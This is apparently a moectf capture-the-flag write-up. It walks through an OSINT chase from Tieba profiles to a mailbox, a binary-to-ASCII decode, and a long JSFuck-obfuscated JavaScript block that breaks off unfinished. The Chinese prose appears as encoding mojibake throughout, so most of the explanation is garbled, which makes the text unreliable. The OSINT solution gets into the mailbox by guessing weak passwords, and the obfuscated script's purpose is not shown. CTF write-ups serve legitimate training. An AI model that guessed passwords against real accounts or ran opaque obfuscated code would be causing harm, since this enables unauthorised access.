çš„ç¤¾å·¥é¢˜</h2><p>æç¤ºè´´å§ï¼Œæˆ‘ä»¬æ¥åˆ°<code>moectfå§</code>ï¼Œå‘ç°è¿™æ ·ä¸€ä¸ªå¸–å­</p><img src="https://i.loli.net/2020/08/09/vd5xKPI8GijfU1J.jpg" alt="_Z1G_175TDBK@1F05F@355Q.jpg" style="zoom: 33%;" /><p>æ²¡æœ‰é¢å¤–çš„ä¿¡æ¯ï¼Œäºæ˜¯æˆ‘ä»¬æ¥åˆ°å‘å¸–äººçš„ä¸»é¡µé¢ï¼Œå‘ç°å‘å¸–äººåªå…³æ³¨äº†ä¸€ä¸ªäºº</p><img src="https://i.loli.net/2020/08/09/NbqLYV6teWK5ac4.jpg" alt="6NGB@MPTK@K3CHM3UK7IN_C.jpg" style="zoom:33%;" /><p>æˆ‘ä»¬æ¥åˆ°è¿™ä¸ªäººçš„ä¸»é¡µé¢çœ‹çœ‹</p><img src="https://i.loli.net/2020/08/09/GncNxdL3VBOEqme.jpg" alt="4_ZSME_W6O4V@_X_OT2_I_K.jpg" style="zoom: 33%;" /><p>æ²¡æœ‰æ”¶è·ï¼Œæˆ‘ä»¬åˆæŸ¥çœ‹ä»–æ‰€å…³æ³¨çš„è´´å§</p><img src="https://i.loli.net/2020/08/09/QCOLqFobD9VR6Pz.jpg" alt="8_89V_9@_634~83__YVG_8D.jpg" style="zoom:33%;" /><p>ä»ä¸‹å¾€ä¸Šçœ‹æ˜¯ï¼š<code>923431ourmail.</code></p><p>æ¨æµ‹åº”è¯¥æ˜¯ä¸€ä¸ªé‚®ç®±ï¼Œä½†æ˜¯ç‚¹çš„åé¢çš„åŸŸåä¸æ¸…æ¥š</p><p>ç™¾åº¦ourmailå¾—åˆ°<code>ourmail.cn</code>ï¼Œäºæ˜¯æˆ‘ä»¬çŸ¥é“äº†ä¸€ä¸ªå«åšourmailçš„ä¸œè¥¿XD</p><p>åœ¨ourmailæœç´¢<a href="mailto:&#57;&#50;&#51;&#x34;&#x33;&#49;&#64;&#x6f;&#x75;&#114;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#110;">&#57;&#50;&#51;&#x34;&#x33;&#49;&#64;&#x6f;&#x75;&#114;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#110;</a>ï¼Œæœç„¶æœ‰</p><p><img src="https://i.loli.net/2020/08/09/vuzECAyDQGUibWx.png" alt="image.png"></p><p>æ²¡ç»™å¯†ç ï¼Œæ¨æµ‹æ˜¯å¼±å£ä»¤ï¼Œå°è¯•äº†å‡ ä¸ªå¼±å£ä»¤å¾—åˆ°åŠ ç¾¤å¯†ç <code>a123456</code></p><p>è¿›å…¥åå‘ç°è¿™æ ·ä¸€ä¸ªé‚®ä»¶ï¼š</p><p><img src="https://i.loli.net/2020/08/09/o6kIlzaSBTD8Vs2.png" alt="image.png"></p><p>å‘å¸–äººå«<code>/s</code>ï¼Œé‚®ä»¶å†…å®¹æ˜¯<code>address: 1O9JFcsUyqQ7T85WXmHH6nQ </code>ï¼Œè¿˜å›äº†ä¸ª<code>a3cj</code></p><p>&#x2F;s&#x2F;addresså¾ˆæ˜æ˜¾æ˜¯ç™¾åº¦ç½‘ç›˜é“¾æ¥çš„æ ¼å¼</p><p>è¾“å…¥<code>pan.baidu.com/s/1O9JFcsUyqQ7T85WXmHH6nQ</code>ï¼Œæœç„¶å¾—åˆ°äº†ä¸€ä¸ªåˆ†ææ–‡ä»¶çš„é“¾æ¥ </p><p><img src="https://i.loli.net/2020/08/09/M6dEt8lkYCz3XFm.png" alt="image.png"></p><p>æˆ‘ä»¬å°†<code>a3cj</code>ä½œä¸ºæå–ç è¾“å…¥ï¼ŒæˆåŠŸè·å¾—æ–‡ä»¶ï¼Œä¸‹è½½ï¼Œè§£å‹å¾—å¦‚ä¸‹æ–‡æœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3RmJTdCdzB3X1kwdV9jNG5fZjFuZF9tM19vdVQlMjElN0Q=</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒæ˜æ˜¾çš„base64ç‰¹å¾ï¼Œè§£å¯†ï¼Œå¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;w0w_Y0u_c4n_f1nd_m3_ouT!&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸-ä¼š-å§-ï¼Ÿ-å°±-è¿™-Â¿"><a href="#ä¸-ä¼š-å§-ï¼Ÿ-å°±-è¿™-Â¿" class="headerlink" title="ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿"></a>ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿</h2><p>è€é˜´é˜³äººle</p><p>å›¾ç‰‡æ”¹åç¼€zipè§£å‹å¾—æ–‡æœ¬å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ </span><br><span class="line">ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ ä¸ä¼šå§ï¼Ÿ å°±è¿™Â¿ å°±è¿™Â¿ </span><br></pre></td></tr></table></figure><p>æ–‡æœ¬ä¸­åªæœ‰<code>ä¸ä¼šå§ï¼Ÿ</code>å’Œ<code>å°±è¿™Â¿</code>ï¼Œæ¨æµ‹æ˜¯äºŒè¿›åˆ¶</p><p>æ¯è¡Œé•¿åº¦éƒ½æ˜¯å…«ä¸ªè¯ï¼Œæœ«å°¾éƒ½æ˜¯â€œå°±è¿™Â¿â€ï¼ŒASCIIç çš„äºŒè¿›åˆ¶æœ€é«˜ä½éƒ½æ˜¯0ï¼Œæ•…æ¨æµ‹æ˜¯ASCIIç é€†åº</p><p>å·¥å…·äººæ‰‹åŠ¨è½¬ç ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">10011010</span><br><span class="line">00001100</span><br><span class="line">10101110</span><br><span class="line">11111010</span><br><span class="line">11101110</span><br><span class="line">00010110</span><br><span class="line">00101100</span><br><span class="line">00101110</span><br><span class="line">11111100</span><br><span class="line">10110100</span><br><span class="line">00001100</span><br><span class="line">01110110</span><br><span class="line">10001100</span><br><span class="line">10011110</span><br><span class="line">11111010</span><br><span class="line">00101110</span><br><span class="line">00010110</span><br><span class="line">10001100</span><br><span class="line">11001010</span><br><span class="line">11111100</span><br></pre></td></tr></table></figure><p>é€†åºåè½¬æˆæ•°å­—å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">89</span><br><span class="line">48</span><br><span class="line">117</span><br><span class="line">95</span><br><span class="line">119</span><br><span class="line">104</span><br><span class="line">52</span><br><span class="line">116</span><br><span class="line">63</span><br><span class="line">45</span><br><span class="line">48</span><br><span class="line">110</span><br><span class="line">49</span><br><span class="line">121</span><br><span class="line">95</span><br><span class="line">116</span><br><span class="line">104</span><br><span class="line">49</span><br><span class="line">83</span><br><span class="line">63</span><br></pre></td></tr></table></figure><p>å¯¹ç…§ASCIIç è¡¨å³å¾—flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_wh4t?-0n1y_th1S?&#125;</span><br></pre></td></tr></table></figure><h2 id="A3FXCK"><a href="#A3FXCK" class="headerlink" title="A3FXCK"></a>A3FXCK</h2><p>æƒ¯ä¾‹çš„å›¾ç‰‡åç¼€åæ”¹zipè§£å‹å¾—åˆ°è¿™æ ·ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£</p><p><img src="https://i.loli.net/2020/10/08/La7GHyJqUgs8Ypk.png" alt="image.png"></p><p>å¼€å¤´ç¬¬ä¸€è¡Œæç¤º<code>123456</code>å¯¹åº”<code>[]()+!</code>ï¼Œè€Œæ–‡æœ¬ä¸­å­˜åœ¨<code>luoq1an</code>ã€<code>arttnba2</code>ã€<code>arttnba3</code>ã€<code>luoqi4n</code>ã€<code>arttnba5</code>ã€<code>arttnba6</code>ï¼Œæ•…è€ƒè™‘è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢</p><p>å¾—åˆ°å¦‚ä¸‹æ–‡æœ¬</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[